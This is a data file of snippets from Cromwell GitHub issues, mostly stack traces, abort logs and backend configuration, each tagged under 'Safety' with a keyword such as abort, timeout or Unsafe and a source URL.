com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:12037,abort,abort,12037,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"equest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:46,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:47,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:48,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:49,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:50,94] [info] Waiting for 1 workflows to abort...; ^C[2016-10-27 13:10:51,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:52,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:53,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:54,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:55,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:56,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:57,16] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientReque",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:16584,abort,abort,16584,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"equest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:57,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:58,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:59,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:00,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:01,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:02,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:03,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:04,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:05,57] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.Abstra",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:19101,abort,abort,19101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"equest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:11:05,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:06,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:07,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:08,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:09,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:10,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:11,95] [info] Waiting for 1 workflows to abort...; Killed; lichtens@lichtens-big:~/test_eval$ [2016-10-27 13:11:12,80] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.exec",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:21409,abort,abort,21409,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"er-1282 INFO - WorkflowExecutionActor [UUID(8a965a5e)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:29:42,727 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(73be7f27)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:31:29,146 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(13965e09)]: Abort received. Aborting 10 EJEAs; 2016-12-12 18:31:46,093 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(804a56b6)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:32:05,063 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: A",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:1594,Abort,Abort,1594,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"ervices.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ^C[2016-10-27 13:10:13,93] [info] WorkflowManagerActor: Received shutdown signal.; [2016-10-27 13:10:13,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:13,93] [info] WorkflowManagerActor Aborting all workflows; [2016-10-27 13:10:14,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:15,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:16,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:17,93] [info] Waiting for 1 workflows to abort...; ^C^C[2016-10-27 13:10:18,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:19,33] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonC",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:5170,abort,abort,5170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"estarted the server as well. Can't find any other config/cache file where it has saved old address. Sometime workflows are fine pointing to new root but sometime not. <!-- Which backend are you running? -->; SLURM on cromwell 36. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. backend {; # Override the default backend.; default = ""PhoenixSLURM"". # The list of providers.; providers {. PhoenixSLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; String userid; String partitions; String memory_per_node; Int nodes; Int cores; String time; """""". # If an 'exit-code-timeout-seconds' value is specified:; # - When a job has not been alive for longer than this timeout; # - And has still not produced an RC file; # - Then it will be marked as Failed.; # Warning: If set, Cromwell has to run 'check-alive' for every job at regular intervals (unrelated to this timeout). exit-code-timeout-seconds = 600. submit = """"""; chmod 770 -R ${cwd}; sudo change-files.sh ${userid} ${cwd}; phoenix_home_cwd=""/home/${userid}""; phoenix_home_out=""/home/${userid}/stdout""; phoenix_home_err=""/home/${userid}/stderr"". phoenix_script=${script}_phonix; cat ${script} | sed -s ""s@#\!/bin/bash@#\!/bin/bash\nsource '/etc/profile' @g"" > $phoenix_script. sbatch --uid=${userid} --gid=${userid} \; -J ${job_name} \; -p ${partitions} \; -N ${nodes} \; -n ${cores} \; --mem=${memory_per_node} \; --time=${time} \; -D $phoenix_home_cwd \; -o $phoenix_home_out \; -e $phoenix_home_err \; $phoenix_script; """""". kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*"". root = ""/fast/gdr/uat/cromwell-executions""; }; }. } # providers. } # backend. # https://gatkforums.broadinstitute.org/wdl/discussion/9536/how-do-i-set-up-a-mysql-database-for-cromwell; # http://slick.lightbend.com/doc/",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4404:1979,timeout,timeout,1979,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4404,1,['timeout'],['timeout']
Safety,"es} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec --userns -B ${cwd}:${docker_cwd} $IMAGE ${job_shell} ${script}""; """"""; ```. Just two things I'd like to discuss. Firstly, because you are pulling the docker image inside the sbatch script, this depends on the cluster you're working on allowing network access for the workers. While that is possible on our local cluster, my discussion with some sysadmins made me realise that this wasn't necessarily commonplace, and even on our cluster they strongly discouraged me from relying too heavily on it. This made me look for a solution that was even more generalizable. This is why I `singularity build` the image before I submit it, using the head node. This ensures that all network-requiring work is done on the head node, where network access is guaranteed. I also make sure to set a cache directory, so we don't download the same docker image multiple times in the case of a scatter job etc. Of course, if you do have network access for your workers and the admins have no issue with you using it, pulling the image from the worker is probably a better option to avoid hogging the head node. The second main difference in my config is that the singularity binary I was using did not have `setuid` permissions, meaning that I had to use the sandbox format, and run the image using `--userns`. This is obviously only required if your sysadmins don't trust `singularity`, but I think it's important to demonstrate a way of running containers without *any* privileges at all. @geoffjentry all this discussion is obviously going way beyond this original PR. Once we've settled on our recommendations, how do you think we should share this information with the Cromwell community? Is an example config in the Cromwell repo the best way (like this PR), or would it serve better to have a new page in the Cromwell documentation? I'm sure that I (and @illusional if he is able) would be happy to write this up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475:1639,avoid,avoid,1639,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475,1,['avoid'],['avoid']
Safety,"etProperty\n value = _GetPropertyWithoutD; efault(prop, properties_file)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 1539, in _GetPropertyWithoutDefault\n value = callback()\n; File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py\"", line 693, in _GetGCEProject\n return c_gce.Metadata().Project()\n File \""/usr/local/share/googl; e/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py\"", line 104, in Project\n gce_read.GOOGLE_GCE_METADATA_PROJECT_URI)\n File \""/usr/local/share/google/google-cloud-sdk/lib/g; ooglecloudsdk/core/util/retry.py\"", line 155, in TryFunc\n return func(*args, **kwargs), None\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.p; y\"", line 41, in _ReadNoProxyWithCleanFailures\n return gce_read.ReadNoProxy(uri)\n File \""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py\"", li; ne 50, in ReadNoProxy\n request, timeout=timeout_property).read()\n File \""/usr/lib/python2.7/urllib2.py\"", line 401, in open\n response = self._open(req, data)\n File \""/usr/lib/py; thon2.7/urllib2.py\"", line 419, in _open\n '_open', req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 379, in _call_chain\n result = func(*args)\n File \""/usr/lib/python2.7/urllib; 2.py\"", line 1211, in http_open\n return self.do_open(httplib.HTTPConnection, req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1184, in do_open\n r = h.getresponse(buffering=True); \n File \""/usr/lib/python2.7/httplib.py\"", line 1072, in getresponse\n response.begin()\n File \""/usr/lib/python2.7/httplib.py\"", line 408, in begin\n version, status, reason = self; ._read_status()\n File \""/usr/lib/python2.7/httplib.py\"", line 366, in _read_status\n line = self.fp.readline()\n File \""/usr/lib/python2.7/socket.py\"", line 447, in readline\n data; = self._sock.recv(self._rbufsize)\nsocket.timeout: timed out\n); gs://5aa919de-0aa0-43ec-9ec3-288481102b6d/tc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:4952,timeout,timeout,4952,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['timeout'],['timeout']
Safety,"etect_adapter		# automatically detect/trim adapters; 	# optional; 	Int? min_trim_len 		# minimum trim length for cutadapt -m; 	Float? err_rate			# Maximum allowed adapter error rate ; 							# for cutadapt -e	; 	# resource; 	Int? cpu; 	Int? mem_mb; 	Int? time_hr; 	String? disks. 	command {; 		python $(which encode_trim_adapter.py) \; 			${write_tsv(fastqs)} \; 			${""--adapters "" + write_tsv(adapters)} \; 			${if paired_end then ""--paired-end"" else """"} \; 			${if auto_detect_adapter then ""--auto-detect-adapter"" else """"} \; 			${""--min-trim-len "" + min_trim_len} \; 			${""--err-rate "" + err_rate} \; 			${""--nth "" + select_first([cpu,4])}; 	}; 	output {; 		# WDL glob() globs in an alphabetical order; 		# so R1 and R2 can be switched, which results in an; 		# unexpected behavior of a workflow; 		# so we prepend merge_fastqs_'end'_ (R1 or R2); 		# to the basename of original filename; 		# this prefix will be later stripped in bowtie2 task; 		Array[File] trimmed_merged_fastqs = glob(""merge_fastqs_R?_*.fastq.gz""); 	}; 	runtime {; 		cpu : select_first([cpu,2]); 		memory : ""${select_first([mem_mb,'10000'])} MB""; 		time : select_first([time_hr,24]); 		disks : select_first([disks,""local-disk 100 HDD""]); 	}; }; ```; with Google JES backend, second call of write_tsv() doesn't seem to correctly pass temporary tsv file into a docker container. `${write_tsv()}` works fine.; `${""some string "" + write_tsv()}` does not work. It still has URI prefix `gs://`. ```; [2017-12-07 13:37:45,35] [info] JesAsyncBackendJobExecutionActor [17f0658fatac.trim_adapter:1:1]: python $(which encode_trim_adapter.py) \; /cromwell_root/atac-seq-pipeline-workflows/ENCSR889WQX/atac/17f0658f-a4ac-4af8-a8c6-c8910c7f303c/call-trim_adapter/shard-1/write_tsv_1dec3320bf1ad48ec05404d0a505d12b.tmp \; --adapters gs://atac-seq-pipeline-workflows/ENCSR889WQX/atac/17f0658f-a4ac-4af8-a8c6-c8910c7f303c/call-trim_adapter/shard-1/write_tsv_d3da014369f27e577cdffc1919be7d8e.tmp \; \; --auto-detect-adapter \; \; \; --nth 2; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3032:2324,detect,detect-adapter,2324,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3032,1,['detect'],['detect-adapter']
Safety,"exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2019-04-18 13:22:35,882 cromwell-system-akka.dispatchers.engine-dispatcher-42 ERROR - WorkflowManagerActor Workflow 4057b0c6-0019-4a00-b8af-e392fbf89697 failed (during ExecutingWorkflowState): cromwell.core.CromwellFatalException: java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor; 	at cromwell.core.CromwellFatalException$.apply(core.scala:22); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:39); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.applyOrElse(Retry.scala:38); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run$$$capture(Promise.scala:60); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:4390,recover,recoverWith,4390,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,1,['recover'],['recoverWith']
Safety,"f possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->; We are using cromwell through broadinstitute/cromwell:87-ecd44b6 image.; cromwell configuration:; ```; include required(classpath(""application"")). system.new-workflow-poll-rate=1. // increase timeout for http requests..... getting meta-data can timeout for large workflows.; akka.http.server.request-timeout=600s. # Maximum number of input file bytes allowed in order to read each type.; # If exceeded a FileSizeTooBig exception will be thrown.; system {; 	job-rate-control {; 	 jobs = 100; 	 per = 1 second; 	}; input-read-limits {; lines = 128000000; bool = 7; int = 19; float = 50; string = 1280000; json = 12800000; tsv = 1280000000; map = 128000000; object = 128000000; }. # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown is a multi-phase process, each phase having its own configurable timeout. See the Dev Wiki for more details.; 	graceful-server-shutdown = true; max-concurrent-workflows = 5000. io {; throttle {; # # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # # the quota availble on the GCS API; number-of-requests = 100000; per = 100 seconds; }; }; }. akka {; # Optionally set / override any akka settings; http {; server {; # Increasing these timeouts allow rest api responses for very large jobs; # to be returned to the user. When the timeout is reached the server would respond; # `The server was not able to produce a timely response to your request.`; # https://gatkforums.broadinstitute.org/wdl/discussion/10209/retrieving-metadata-for-large-workflows; request-timeout = 600s; idle-timeout = 600s; }; }; }. services {; MetadataService {; #class = ""cromwell.services.metadata.impl.MetadataServiceActor""; config {; metadata-read-row-number-safety-threshold = 2000000; # # For normal usage the default",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:8135,timeout,timeout,8135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['timeout'],['timeout']
Safety,"fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:2392,Unsafe,Unsafe,2392,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['Unsafe'],['Unsafe']
Safety,"fdaa80c0000 nid=0xa56 waiting on condition [0x00007fda90575000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:1515,Unsafe,Unsafe,1515,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['Unsafe'],['Unsafe']
Safety,flaky centaur TES restart/abort test,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3571:26,abort,abort,26,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3571,1,['abort'],['abort']
